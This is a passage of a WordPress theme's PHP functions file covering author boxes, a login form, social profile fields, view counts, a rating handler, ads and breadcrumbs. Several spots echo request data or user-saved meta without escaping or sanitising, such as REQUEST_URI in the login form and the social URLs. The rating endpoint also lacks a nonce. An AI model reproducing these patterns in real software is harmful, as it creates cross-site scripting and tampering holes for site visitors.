			        <a class="ttip" href="<?php the_author_meta( 'linkedin' ); ?>" title="<?php the_author_meta( 'display_name' ); ?> <?php _e( '  on Linkedin', 'bd' ); ?>"><i class="social_icon-linkedin"></i></a>
			    <?php endif ?>
			    <?php if ( get_the_author_meta( 'flickr' ) ) : ?>
			        <a class="ttip" href="<?php the_author_meta( 'flickr' ); ?>" title="<?php the_author_meta( 'display_name' ); ?><?php _e( '  on Flickr', 'bd' ); ?>"><i class="social_icon-flickr"></i></a>
			    <?php endif ?>
			    <?php if ( get_the_author_meta( 'youtube' ) ) : ?>
			        <a class="ttip" href="<?php the_author_meta( 'youtube' ); ?>" title="<?php the_author_meta( 'display_name' ); ?><?php _e( '  on YouTube', 'bd' ); ?>"><i class="social_icon-youtube"></i></a>
			    <?php endif ?>
			    <?php if ( get_the_author_meta( 'pinterest' ) ) : ?>
			        <a class="ttip" href="<?php the_author_meta( 'pinterest' ); ?>" title="<?php the_author_meta( 'display_name' ); ?><?php _e( '  on Pinterest', 'bd' ); ?>"><i class="social_icon-pinterest"></i></a>
			    <?php endif ?>
			</div>
        </div>
        <?php endif; ?>
        <?php else: ?>
        <div class="login_form">
            <form action="<?php echo home_url() ?>/wp-login.php" method="post">
                <input type="text" name="log" id="log" size="30" placeholder="User Name"  value="<?php _e( 'Username' , 'bd' ) ?>"  />
                <input type="password" name="pwd" size="30" placeholder="Password" value="<?php _e( 'Password' , 'bd' ) ?>" />
                <div class="remember">
                    <input name="rememberme" id="rememberme" type="checkbox" checked="checked" value="forever" />
                    <?php _e( 'Remember Me' , 'bd' ) ?>
                    <button value="<?php _e( 'Login' , 'bd' ) ?>" name="Submit" type="submit" class="btn"><?php _e( 'Login' , 'bd' ) ?></button>
                </div>

                <input type="hidden" name="redirect_to" value="<?php echo $_SERVER['REQUEST_URI']; ?>" />
                <ul class="login_list">
                    <li>
                        <a href="<?php echo home_url() ?>/wp-login.php?action=lostpassword">
                            <?php _e( 'Forgot your password?' , 'bd' ) ?>
                        </a>
                    </li>
                </ul>

            </form>
        </div>
    <?php
    endif;
    echo "\n" .'</div>'. "\n";
}

/**
 * Author
 */
function bd_author_box($user = 10,$avatar = true , $social = true )
{
    global $user_ID, $user_identity;
    echo '<div class="post-warpper">'. "\n";
    if( $avatar ) :
    ?>
        <div class="avatar">
            <?php echo get_avatar( get_the_author_meta( 'user_email' ), apply_filters( 'MFW_author_bio_avatar_size', 96 ) ); ?>
        </div>
    <?php endif; ?>

    <div class="post-caption">
    <p class="bio-author-desc">
        <?php the_author_meta( 'description' ); ?>
    </p>

    <div class="social-icons icon-12 bio-author-social">
    <?php if ( get_the_author_meta( 'url' ) ) : ?>
        <a class="ttip" href="<?php the_author_meta( 'url' ); ?>" title="<?php the_author_meta( 'display_name' ); ?><?php _e( "'s site", 'bd' ); ?>"><i class="icon-home"></i></a>
    <?php endif ?>
    <?php if ( get_the_author_meta( 'facebook' ) ) : ?>
        <a class="ttip" href="<?php the_author_meta( 'facebook' ); ?>" title="<?php the_author_meta( 'display_name' ); ?> <?php _e( '  on Facebook', 'bd' ); ?>"><i class="social_icon-facebook"></i></a>
    <?php endif ?>
    <?php if ( get_the_author_meta( 'twitter' ) ) : ?>
        <a class="ttip" href="http://twitter.com/<?php the_author_meta( 'twitter' ); ?>" title="<?php the_author_meta( 'display_name' ); ?><?php _e( '  on Twitter', 'bd' ); ?>"><i class="social_icon-twitter"></i></a>
    <?php endif ?>
    <?php if ( get_the_author_meta( 'google' ) ) : ?>
        <a class="ttip" href="<?php the_author_meta( 'google' ); ?>" title="<?php the_author_meta( 'display_name' ); ?> <?php _e( '  on Google+', 'bd' ); ?>"><i class="social_icon-google"></i></a>
    <?php endif ?>
    <?php if ( get_the_author_meta( 'linkedin' ) ) : ?>
        <a class="ttip" href="<?php the_author_meta( 'linkedin' ); ?>" title="<?php the_author_meta( 'display_name' ); ?> <?php _e( '  on Linkedin', 'bd' ); ?>"><i class="social_icon-linkedin"></i></a>
    <?php endif ?>
    <?php if ( get_the_author_meta( 'flickr' ) ) : ?>
        <a class="ttip" href="<?php the_author_meta( 'flickr' ); ?>" title="<?php the_author_meta( 'display_name' ); ?><?php _e( '  on Flickr', 'bd' ); ?>"><i class="social_icon-flickr"></i></a>
    <?php endif ?>
    <?php if ( get_the_author_meta( 'youtube' ) ) : ?>
        <a class="ttip" href="<?php the_author_meta( 'youtube' ); ?>" title="<?php the_author_meta( 'display_name' ); ?><?php _e( '  on YouTube', 'bd' ); ?>"><i class="social_icon-youtube"></i></a>
    <?php endif ?>
    <?php if ( get_the_author_meta( 'pinterest' ) ) : ?>
        <a class="ttip" href="<?php the_author_meta( 'pinterest' ); ?>" title="<?php the_author_meta( 'display_name' ); ?><?php _e( '  on Pinterest', 'bd' ); ?>"><i class="social_icon-pinterest"></i></a>
    <?php endif ?>
    <?php
    echo "\n" .'</div>'. "\n";
    echo "\n" .'</div>'. "\n";
    echo "\n" .'</div>'. "\n";
}

/**
 * Add user's social accounts
 */
add_action( 'show_user_profile', 'bd_show_extra_profile_fields' );
add_action( 'edit_user_profile', 'bd_show_extra_profile_fields' );
function bd_show_extra_profile_fields( $user )
{
    ?>
    <h3><?php _e( 'Social Networking', 'bd' ) ?></h3>
    <table class="form-table">
        <tr>
            <th><label for="facebook">FaceBook URL</label></th>
            <td>
                <input type="text" name="facebook" id="facebook" value="<?php echo esc_attr( get_the_author_meta( 'facebook', $user->ID ) ); ?>" class="regular-text" /><br />
            </td>
        </tr>
        <tr>
            <th><label for="twitter">Twitter Username</label></th>
            <td>
                <input type="text" name="twitter" id="twitter" value="<?php echo esc_attr( get_the_author_meta( 'twitter', $user->ID ) ); ?>" class="regular-text" /><br />
            </td>
        </tr>
        <tr>
            <th><label for="google">Google + URL</label></th>
            <td>
                <input type="text" name="google" id="google" value="<?php echo esc_attr( get_the_author_meta( 'google', $user->ID ) ); ?>" class="regular-text" /><br />
            </td>
        </tr>
        <tr>
            <th><label for="linkedin">linkedIn URL</label></th>
            <td>
                <input type="text" name="linkedin" id="linkedin" value="<?php echo esc_attr( get_the_author_meta( 'linkedin', $user->ID ) ); ?>" class="regular-text" /><br />
            </td>
        </tr>
        <tr>
            <th><label for="pinterest">Pinterest URL</label></th>
            <td>
                <input type="text" name="pinterest" id="pinterest" value="<?php echo esc_attr( get_the_author_meta( 'pinterest', $user->ID ) ); ?>" class="regular-text" /><br />
            </td>
        </tr>
        <tr>
            <th><label for="youtube">YouTube URL</label></th>
            <td>
                <input type="text" name="youtube" id="youtube" value="<?php echo esc_attr( get_the_author_meta( 'youtube', $user->ID ) ); ?>" class="regular-text" /><br />
            </td>
        </tr>
        <tr>
            <th><label for="flickr">Flickr URL</label></th>
            <td>
                <input type="text" name="flickr" id="flickr" value="<?php echo esc_attr( get_the_author_meta( 'flickr', $user->ID ) ); ?>" class="regular-text" /><br />
            </td>
        </tr>
    </table>
<?php
}

/**
 * Save user's social accounts
 */
add_action( 'personal_options_update', 'bd_save_extra_profile_fields' );
add_action( 'edit_user_profile_update', 'bd_save_extra_profile_fields' );
function bd_save_extra_profile_fields( $user_id )
{
    if (!current_user_can( 'edit_user', $user_id )) return false;
    update_user_meta( $user_id, 'google', $_POST['google'] );
    update_user_meta( $user_id, 'pinterest', $_POST['pinterest'] );
    update_user_meta( $user_id, 'twitter', $_POST['twitter'] );
    update_user_meta( $user_id, 'facebook', $_POST['facebook'] );
    update_user_meta( $user_id, 'linkedin', $_POST['linkedin'] );
    update_user_meta( $user_id, 'flickr', $_POST['flickr'] );
    update_user_meta( $user_id, 'youtube', $_POST['youtube'] );
}

/**
 * pagenavi
 */
if(!function_exists('bd_pagenavi')):
function bd_pagenavi($pages = '', $range = 2)
{
    global $bd_data;
    $showitems = ($range * 2)+1;
    global $paged;

    if(empty($paged)) $paged = 1;
    if($pages == '')
    {
        global $wp_query;
        $pages = $wp_query->max_num_pages;
        if(!$pages)
        {
            $pages = 1;
        }
    }
    if(1 != $pages)
    {
        echo "<div class='pagenavi clear'>\n";
        if($paged > 1) echo "<a class='pagenavi-prev' href='".get_pagenum_link($paged - 1)."'> ".__('Previous ', 'bd')."</a>\n";
        for ($i=1; $i <= $pages; $i++)
        {
            if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems ))
            {
                echo ($paged == $i)? "<span class='pagenavi-current'>".$i."</span>":"<a href='".get_pagenum_link($i)."' class='pagenavi-inactive' >".$i."</a>\n";
            }
        }
        if ($paged < $pages) echo "<a class='pagenavi-next' href='".get_pagenum_link($paged + 1)."'>".__('Next', 'bd')." </a>\n";
        echo "</div><!-- .pagenavi/-->\n";
    }
}
endif;

/**
 * Post Top
 */
function bd_post_top()
{
    if(get_post_meta(get_the_ID(), 'bd_post_type', true))
    {
        $post_type = get_post_meta(get_the_ID(), 'bd_post_type', true);
        if($post_type == 'post_image')
        {
            bd_wp_thumb( '620', '360', 'lightbox' );
        }
        elseif($post_type == 'post_slider')
        {
            bd_wp_gallery( '620', '360' );
        }
        elseif($post_type == 'post_soundcloud')
        {
            $img_w           = 620;
            $post_type       = get_post_meta(get_the_ID(), 'bd_post_type', true);
            $url             = get_post_meta(get_the_ID(), 'bd_soundcloud_url', true);
            if($post_type == 'post_soundcloud')
            {
                echo '<div class="soundcloud-box" style="width: '. $img_w .'px;"><iframe width="100%" height="180" scrolling="no" frameborder="no" src="https://w.soundcloud.com/player/?url='. $url .'&amp;auto_play=false&amp;show_artwork=true"></iframe></div>'."\n";
            }
        }
        elseif($post_type == 'post_video')
        {
            bd_wp_video('620','360');
        }
        elseif($post_type == 'post_googlemap')
        {
            $src            = get_post_meta(get_the_ID(), 'bd_google_maps_url', true);
            $width          = 620;
            $height         = 360;
            echo '<div class="google-box"><iframe width="'.$width.'" height="'.$height.'" frameborder="0" scrolling="no" marginheight="0" marginwidth="0" src="'.$src.'&amp;output=embed"></iframe></div>';
        }
        else
        {
        }
    }
}

/**
 * Post meta
 */
function bd_post_meta(){

    global $bd_data;
    $bd_hide_post_meta = get_post_meta(get_the_ID(), 'bd_hide_post_meta', true);
    if(($bd_data['post_meta'] && empty($bd_hide_post_meta)) || $bd_hide_post_meta == 'yes'):
        ?>
        <div class="entry-meta">
        <?php

            if( bdayh_get_option( 'home_review' ) ) {
            	if ( is_home() ) {
	                echo bd_wp_post_rate();
	                echo '<div class="clear"></div>';
                }
            }

            if( $bd_data['post_meta_author'] ) {
                ?>
                <span>
                        <?php _e('Autor : ','bd'); the_author_posts_link(); ?>
                </span>
                <?php if ( get_the_author_meta( 'google' ) ){ ?>
					<div style="display:none" class="vcard author" itemprop="author" itemscope itemtype="http://schema.org/Person"><strong class="fn" itemprop="name"><a href="<?php the_author_meta( 'google' ); ?>?rel=author">+<?php echo get_the_author(); ?></a></strong></div>
				<?php } else { ?>
					<div style="display:none" class="vcard author" itemprop="author" itemscope itemtype="http://schema.org/Person"><strong class="fn" itemprop="name"><?php the_author_posts_link(); ?></strong></div>
				<?php } ?>
                <?php
            }

            if( $bd_data['post_meta_date'] ) {
                if( bdayh_get_option('date_format') ) {
                    echo "<span itemprop='datePublished' class='date updated'>"; the_time( bdayh_get_option('date_format') ); echo "</span>";
                } else { echo "<span itemprop='datePublished' class='date updated'>"; the_time('F j, Y');  echo "</span>"; }
            }

            if( $bd_data['post_meta_comments'] ) {
                if ( ! post_password_required() && ( comments_open() || get_comments_number() ) ) {
                    ?>
                    <span class="comments-link"><?php comments_popup_link( __( 'Comenta', 'bd' ), __( '1 Comment', 'bd' ), __( '% Comments', 'bd' ) ); ?></span>
                <?php
                }
            }

            if ( is_page() ) {
            } else {
                if( $bd_data['post_meta_cats'] ){
                    echo "<span class='post_meta_cats'>" .__('En','bd'). "\n";
                    the_category(', ');
                    echo "</span>\n";
                }
			}

            if($bd_data['post_meta_views']):
                if (is_single()) :
                    echo "<span class='post_meta_views'><i class='icon-eye-open'></i>\n";
                    setPostViews(get_the_ID()); echo getPostViews(get_the_ID());
                    echo "</span>\n";
                elseif(is_page()) :
                    echo "<span class='post_meta_views'><i class='icon-eye-open'></i>\n";
                    setPostViews(get_the_ID()); echo getPostViews(get_the_ID());
                    echo "</span>\n";
                else :
                    echo "<span class='post_meta_views'><i class='icon-eye-open'></i>\n";
                    echo getPostViews(get_the_ID());
                    echo "</span>\n";
                endif;
            endif;

            if( bdayh_get_option( 'post_heart_like' ) ) { if (is_single()) { echo getPostLikeLink( get_the_ID() ); } }

            edit_post_link( __( 'Editar', 'bd' ), '<span class="edit-link">', '</span>' );

            ?>
        </div><!-- .entry-meta -->
    <?php
    endif;
}

/**
 * Post views
 */
function getPostViews($postID)
{
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return "0 Vistos";
    }
    return $count. __(' Vistos','bd');
}
function setPostViews($postID)
{
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count=='')
    {
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    }else{
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
}
remove_action( 'wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0);

/**
 * Add it to a column in WP-Admin
 */
add_filter('manage_posts_columns', 'posts_column_views');
add_action('manage_posts_custom_column', 'posts_custom_column_views',5,2);
function posts_column_views($defaults)
{
    $defaults['post_views'] = __('views','bd');
    return $defaults;
}
function posts_custom_column_views($column_name, $id)
{
    if($column_name === 'post_views')
    {
        echo getPostViews(get_the_ID());
    }
}
/* Thumbnail */
add_filter('manage_posts_columns', 'posts_column_thumb');
add_action('manage_posts_custom_column', 'posts_custom_column_thumb',10,2);
function posts_column_thumb($posts_columns)
{
    $columns = array();
    foreach ($posts_columns as $column => $name){
        if ($column == 'title'){
            $columns['Thumbnail'] = 'Thumbnail';
            $columns[$column] = $name;
        } else $columns[$column] = $name;
    }
    return $columns;
}
function posts_custom_column_thumb($column_name, $id){
    if($column_name === 'Thumbnail'){
        if ( function_exists("has_post_thumbnail") && has_post_thumbnail() ) {
            bdayh_img( '40', '40' );
        }
    }
}

/**
 * User Rating
 */
if (!class_exists('user_rating'))
{
    class user_rating
    {
        public $current_rating;
        public $current_position;
        public $count;

        function __construct()
        {
            if (is_single())
            {
                $this->retrieve_values();
            }
            add_action('wp_ajax_bd_rating', array(&$this, 'sync_rating'));
            add_action('wp_ajax_nopriv_bd_rating', array(&$this, 'sync_rating'));
            add_action('wp_enqueue_scripts', array(&$this, 'load_scripts'));
        }

        public function load_scripts()
        {
            global $post;
            if ($post)
            {
                if (is_singular()) {
                    wp_localize_script('jquery', 'bd_script', array(
                            'post_id' => $post->ID,
                            'ajaxurl' => admin_url('admin-ajax.php')
                        )
                    );
                }
            }
        }

        private function retrieve_values()
        {
            $current_rating = get_post_meta(get_the_ID(), 'current_rating', true);

            if (!$current_rating)
            {
                $current_rating = '0';
            }

            $this->current_rating = $current_rating;
            $current_position = get_post_meta(get_the_ID(), 'current_position', true);

            if (!$current_position)
            {
                $current_position = 0;
            }

            $this->current_position = $current_position;
            $count = get_post_meta(get_the_ID(), 'ratings_count', true);

            if (!$count)
            {
                $count = 0;
            }
            $this->count = $count;
        }

        public function sync_rating()
        {
            $position = (int)$_POST['rating_position'];
            $post_id = (int)$_POST['post_id'];
            $current_position = (int)get_post_meta($post_id, 'current_position', true);

            if (!$current_position)
            {
                $current_position = 0;
            }

            $current_rating = (int)get_post_meta($post_id, 'current_rating', true);

            if (!$current_rating)
            {
                $current_rating = 0;
            }

            $count = (int)get_post_meta($post_id, 'ratings_count', true);

            if (!$count)
            {
                $count = 0;
            }

            $new_position = ($current_position * $count + $position) / ($count + 1);
            $new_count = $count + 1;
            $new_rating = floor(($new_position / 10) * 5) / 10;

            update_post_meta($post_id, 'current_position', $new_position, get_post_meta($post_id, 'current_position', true));
            update_post_meta($post_id, 'current_rating', $new_rating, get_post_meta($post_id, 'current_rating', true));
            update_post_meta($post_id, 'ratings_count', $new_count, get_post_meta($post_id, 'ratings_count', true));
            exit;
        }
    }
}
new user_rating();

/**
 * Post Rate
 */
function bd_post_rate()
{
    include (get_template_directory().'/includes/rate.php');
}

function bd_wp_post_rate()
{
    $bd_brief_summary     = get_post_meta(get_the_ID(), 'bd_brief_summary', true);
    $bd_review_enable     = get_post_meta(get_the_ID(), 'bd_review_enable', true);
    $bd_final_score       = get_post_meta(get_the_ID(), 'bd_final_score', true);
    $bd_final_percentage  = $bd_final_score * 20 + 2;

    if( $bd_review_enable && $bd_final_percentage ){
        ?>
        <span class="post-rate">
            <span title="<?php echo $bd_brief_summary; echo' - '; echo $bd_final_percentage; echo'%'; ?>" class="bd-module-a-stars-under leading-article">
                <span class="bd-module-a-stars-over leading-article" style="width:<?php echo $bd_final_percentage ?>%"></span>
            </span>
        </span><!-- .post-rate/-->
        <?php
    }
}

/**
 * bd_post_above_ads
 */
function bd_post_above_ads()
{
    global $bd_data;
    $bd_above_post_adv          = get_post_meta(get_the_ID(), 'bd_above_post_adv', true);
    $bd_above_post_adv_code     = get_post_meta(get_the_ID(), 'bd_above_post_adv_code', true);
    if($bd_above_post_adv == 'yes')
    {
        if((empty($bd_above_post_adv_code)) || $bd_above_post_adv == 'yes')
        {
            echo '<div class="post-adv">'."\n".  stripslashes( $bd_above_post_adv_code ) .'</div><!-- .post-adv/-->' ."\n";
        }
    }
    else
    {
        if($bd_data['show_article_above_ads'] == 1)
        {
            if($bd_data['article_above_ads_code'] != '')
            {
                echo '<div class="post-adv"> '. stripslashes($bd_data['article_above_ads_code']) . '</div><!-- .post-adv/-->' ."\n";
            }
            else
            {
                echo '<div class="post-adv"> <a href="'. $bd_data['article_above_ads_img_url'] .'" title="'. $bd_data['article_above_ads_img_altname'] .'"> <img src="'. $bd_data['article_above_ads_img'] .'" alt="'. $bd_data['article_above_ads_img_altname'] .'" /> </a></div><!-- .post-adv/-->' ."\n";
            }
        }
    }
}

/**
 * bd_post_below_ads
 */
function bd_post_below_ads()
{
    global $bd_data;
    $bd_below_post_adv          = get_post_meta(get_the_ID(), 'bd_below_post_adv', true);
    $bd_below_post_adv_code     = get_post_meta(get_the_ID(), 'bd_below_post_adv_code', true);
    if($bd_below_post_adv == 'yes')
    {
        if((empty($bd_below_post_adv_code)) || $bd_below_post_adv == 'yes')
        {
            echo '<div class="post-adv">'."\n".  stripslashes( $bd_below_post_adv_code ) .'</div><!-- .post-adv/-->' ."\n";
        }
    }
    else
    {
        if($bd_data['show_article_below_ads'] == 1)
        {
            if($bd_data['article_below_ads_code'] != '')
            {
                echo '<div class="post-adv"> '. stripslashes($bd_data['article_below_ads_code']) . '</div><!-- .post-adv/-->' ."\n";
            }
            else
            {
                echo '<div class="post-adv"> <a href="'. $bd_data['article_below_ads_img_url'] .'" title="'. $bd_data['article_below_ads_img_altname'] .'"> <img src="'. $bd_data['article_below_ads_img'] .'" alt="'. $bd_data['article_below_ads_img_altname'] .'" /> </a></div><!-- .post-adv/-->' ."\n";
            }
        }
    }
}

/**
 * Comments
 */
function bd_comment($comment, $args, $depth)
{
    $GLOBALS['comment'] = $comment;
    $add_below = '';

    ?>
    <li <?php comment_class('comment-box'); ?> id="comment-<?php comment_ID() ?>">
    <div class="comment-header">
        <?php echo get_avatar($comment, 50); ?>
        <h3><?php echo get_comment_author_link() ?></h3>
        <p class="comment-meta">
            <?php printf(__('%1$s at %2$s', 'bd'), get_comment_date(),  get_comment_time()) ?></a><?php edit_comment_link(__(' - Edit', 'bd'),'  ','') ?>
        </p>
    </div>
    <div class="comment-body">
        <p>
            <?php if ($comment->comment_approved == '0') : ?>
                <em><?php echo __('Your comment is awaiting moderation.', 'bd') ?></em><br />
            <?php endif; ?>
            <?php comment_text() ?>
        </p>
        <p class="tm-js-reply">
            <?php
                if ( is_rtl() ) {
                    comment_reply_link(array_merge( $args, array('reply_text' => __('<i class="icon-share-alt"></i> Reply', 'bd'), 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) );
                } else {
                    comment_reply_link(array_merge( $args, array('reply_text' => __('<i class="icon-mail-reply"></i> Reply', 'bd'), 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) );
                }
            ?>
        </p>
    </div>
    <?php
}

/**
 * breadcrumb
 */
function bd_breadcrumb()
{
    global $bd_data;
    if($bd_data['breadcrumbs']):
    $delimiter  = ' | ';
    $home       =  __('Home','bd');
    $before     = '<li class="current">';
    $after      = '</li>';
    if ( !is_home() && !is_front_page() || is_paged() )
    {
        echo '<ul class="breadcrumbs">';
        global $post;
        $homeLink = home_url();
        echo '<li><a class="crumbs-home-icon" itemprop="breadcrumb" href="' . $homeLink . '">' . $home . '</a>' . $delimiter . '</li> ';
        if ( is_category() )
        {
            global $wp_query;
            $cat_obj = $wp_query->get_queried_object();
            $thisCat = $cat_obj->term_id;
            $thisCat = get_category($thisCat);
            $parentCat = get_category($thisCat->parent);
            if ($thisCat->parent != 0) echo(get_category_parents($parentCat, TRUE, ' ' . $delimiter . ' '));
            echo $before . '' . single_cat_title('', false) . '' . $after;
        }
        elseif ( is_day() )
        {
            echo '<li><a href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a>' . $delimiter . '</li>';
            echo '<li><a href="' . get_month_link(get_the_time('Y'),get_the_time('m')) . '">' . get_the_time('F') . '</a>' . $delimiter . '</li>';
            echo $before . get_the_time('d') . $after;
        }
        elseif ( is_month() )
        {
            echo '<li><a href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a>' . $delimiter . '</li>';
            echo $before . get_the_time('F') . $after;
        }
        elseif ( is_year() )
        {
            echo $before . get_the_time('Y') . $after;

        } elseif ( is_single() && !is_attachment() )
        {
            if ( get_post_type() != 'post' )
            {
                $post_type = get_post_type_object(get_post_type());
                $slug = $post_type->rewrite;
                echo '<li><a href="' . $homeLink . '/' . $slug['slug'] . '/">' . $post_type->labels->singular_name . '</a>' . $delimiter . '</li>';
                echo $before . get_the_title() . $after;
            }
            else
            {
                $cat = get_the_category(); $cat = $cat[0];
                echo get_category_parents($cat, TRUE, ' ' . $delimiter . ' ');
                echo $before . get_the_title() . $after;
            }
        }
        elseif ( !is_single() && !is_page() && get_post_type() != 'post' )
        {
            $post_type = get_post_type_object(get_post_type());
            echo $before . $post_type->labels->singular_name . $after;
        }
        elseif ( is_attachment() )
        {
            $parent = get_post($post->post_parent);
            $cat = get_the_category($parent->ID); $cat = $cat[0];
            echo get_category_parents($cat, TRUE, ' ' . $delimiter . ' ');
            echo '<li><a href="' . get_permalink($parent) . '">' . $parent->post_title . '</a>' . $delimiter . '</li>';
            echo $before . get_the_title() . $after;
        }
        elseif ( is_page() && !$post->post_parent )
        {
            echo $before . get_the_title() . $after;
        }
        elseif ( is_page() && $post->post_parent )
        {
            $parent_id  = $post->post_parent;
            $breadcrumbs = array();
            while ($parent_id)
            {
                $page = get_page($parent_id);
                $breadcrumbs[] = '<li><a href="' . get_permalink($page->ID) . '">' . get_the_title($page->ID) . '</a></li>';
                $parent_id  = $page->post_parent;
            }
            $breadcrumbs = array_reverse($breadcrumbs);
            foreach ($breadcrumbs as $crumb) echo $crumb . ' ' . $delimiter . ' ';
            echo $before . get_the_title() . $after;
        }
        elseif ( is_search() )
        {
            echo $before . __('Search results for ', 'bd') . '"' . get_search_query() . '"' . $after;

        }
        elseif ( is_tag() )
        {
            echo $before . __('Posts tagged ', 'bd') . '"' . single_tag_title('', false) . '"' . $after;

        } elseif ( is_author() )
        {
            global $author;
            $userdata = get_userdata($author);
            echo $before . __('Articles posted by ', 'bd') . $userdata->display_name . $after;

        } elseif ( is_404() )
        {
            echo $before . __('Error 404 ', 'bd') . $after;
        }
        if ( get_query_var('paged') )
        {
            if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() ) echo ' (';
            echo __('Page', 'bd') . ' ' . get_query_var('paged');
            if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() ) echo ')';
        }
        echo '</ul>';
    }
    endif;
}

/**
 *  Google Fonts
 */
function bd_enqueue_font( $got_font ){
    if ( $got_font ){
        $char_set = '';
        if( bdayh_get_option( 'wp_typography_latin_extended' ) || bdayh_get_option( 'wp_typography_cyrillic' ) || bdayh_get_option( 'wp_typography_cyrillic_extended' ) || bdayh_get_option( 'wp_typography_greek' ) || bdayh_get_option( 'wp_typography_greek_extended' ) || bdayh_get_option( 'wp_typography_vietnamese' ) || bdayh_get_option( 'wp_typography_khmer' ) ){
            $char_set = '&subset=latin';
            if( bdayh_get_option( 'wp_typography_latin_extended' ) )
                $char_set .= ',latin-ext';

            if( bdayh_get_option( 'wp_typography_cyrillic' ) )
                $char_set .= ',cyrillic';

            if( bdayh_get_option( 'wp_typography_cyrillic_extended' ) )
                $char_set .= ',cyrillic-ext';

            if( bdayh_get_option( 'wp_typography_greek' ) )
                $char_set .= ',greek';

            if( bdayh_get_option( 'wp_typography_greek_extended' ) )
                $char_set .= ',greek-ext';

            if( bdayh_get_option( 'wp_typography_khmer' ) )
                $char_set .= ',khmer';

            if( bdayh_get_option( 'wp_typography_vietnamese' ) )
                $char_set .= ',vietnamese';
        }

        $font_pieces = explode(":", $got_font);
        $font_name = $font_pieces[0];
        $font_type = $font_pieces[1];

        if( $font_type == 'non-google' ){}
        elseif( $font_type == 'early-google' ){
            $font_name = str_replace (" ","", $font_pieces[0] );
            $protocol = is_ssl() ? 'https' : 'http';
            wp_enqueue_style( $font_name , $protocol.'://fonts.googleapis.com/earlyaccess/'.$font_name);
        } else {
            $font_name = str_replace (" ","+", $font_pieces[0] );
            $font_variants = str_replace ("|",",", $font_pieces[1] );
            $protocol = is_ssl() ? 'https' : 'http';
            wp_enqueue_style( $font_name , $protocol.'://fonts.googleapis.com/css?family='.$font_name . ':' . $font_variants.$char_set );
        }
    }
}

/**
 *  GET Fonts
 */
function bd_get_font( $got_font )
{
    if($got_font)
    {
        $font_pieces = explode(":", $got_font);
        $font_name = $font_pieces[0];
        $font_name = str_replace('&quot;' , '"' , $font_pieces[0] );
        if (strpos($font_name, ',') !== false)
            return $font_name;
        else
            return "'".$font_name."'";
    }
}

/**
 *  GET Fonts
 */
$google_font_array = json_decode ($google_api_output,true) ;
$items = $google_font_array['items'];
$options_fonts=array();
$options_fonts[''] = "Default Font" ;
$fontID = 0;
foreach ($items as $item)
{
    $fontID++;
    $variants='';
    $variantCount=0;
    foreach ($item['variants'] as $variant)
    {
        $variantCount++;
        if ($variantCount>1) { $variants .= '|'; }
        $variants .= $variant;
    }
    $variantText = ' (' . $variantCount . ' Varaints' . ')';
    if ($variantCount <= 1) $variantText = '';
    $options_fonts[ $item['family'] . ':' . $variants ] = $item['family']. $variantText;
}

/**
 *  Typography
 */
$custom_typography = array(
    "body, body a" => "tybo_general",
    "#top-navigation a, #top-navigation" => "tybo_topbar",
    "#navigation a, #navigation" => "tybo_nav",
    ".logo-name, .logo-name a" => "t_site_title",
    ".page-title h2, .page-title h2 a" => "t_page_title",
    ".blog-v1 article h1.entry-title, .blog-v1 article h1.entry-title a" => "t_single_title",
    ".widget .widget-title h2, ul.tabs_nav li a" => "t_widget_title",
    ".box-title h2, .box-title h2 a" => "t_boxes_title",
    ".entry-content, .entry-content a" => "t_post_entry",
    ".blog-v1 article .entry-meta, .blog-v1 article .entry-meta a" => "t_post_meta",
);

/**
 *  Enqueue Typography
 */
function bd_typography(){
    global $custom_typography;
    foreach( $custom_typography as $selector => $input){
        $option = bdayh_get_option( $input );
        if( !empty($option['font']))
            bd_enqueue_font( $option['font'] ) ;
    }
    bd_enqueue_font( 'Droid Sans:regular|700' ) ;
}
add_action('wp_enqueue_scripts', 'bd_typography');

/**
 *  Format Thumb
 */
function bd_wp_thumb( $img_w ='60', $img_h='60', $light_box='lightbox', $tip ='ttip' )
{
    global $post;
    $thumb      = bd_post_image( 'full' );
    $image      = aq_resize( $thumb, $img_w, $img_h, true );
    //if($image =='') { $image = BD_IMG .'default-thumb.png'; }

    $alt        = get_the_title();
    $link       = get_permalink();

    if( $tip == 'ttip' ){
        $ttip = $tip;
    } else {
        $ttip = '';
    }

    if( $light_box == 'lightbox' )
    {
        $light_box      = $light_box;
        $light_box_href = $thumb;
    }
    else
    {
        $light_box      = '';
        $light_box_href = $link;
    }

    if ( has_post_thumbnail() ) {
        if( $image ) {
            echo '<div class="post-thumb"><a href="'. $light_box_href .'" title="'. $alt .'" class="'. $light_box . $ttip .'"> <img itemprop="image" src="'. $image .'" width="'. $img_w .'" height="'. $img_h .'" alt="'. $alt .'" border="0" /> </a></div><!-- .post-image/-->' ."\n";
        }
    }
}


function bd_home_thumb( $img_w ='', $img_h='', $light_box='lightbox' ){
    global $post;
    $thumb      = bd_post_image( 'full' );
    $image      = aq_resize( $thumb, $img_w, $img_h, true );
    $alt        = get_the_title();
    $link       = get_permalink();

    if( $light_box == 'lightbox' )
    {
        $light_box      = "class='". $light_box ."'";
        $light_box_href = $thumb;
    }
    else
    {
        $light_box      = '';
        $light_box_href = $link;
    }
    if ( strpos( bd_post_image(), 'youtube' ) )
    {
        if( bdayh_get_option( 'all_featured_image' ) == 'fea_lightbox' ) {
            echo '<div class="post-image"><a href="'. $light_box_href .'" title="'. $alt .'" '. $light_box .'> <img itemprop="image" src="'. bd_post_image('full') .'" alt="'. $alt .'" border="0" /> </a></div><!-- .post-image/-->' ."\n";
        } else if( bdayh_get_option( 'all_featured_image' ) == 'fea_link' ) {
            $permalink = get_permalink( $post->ID );
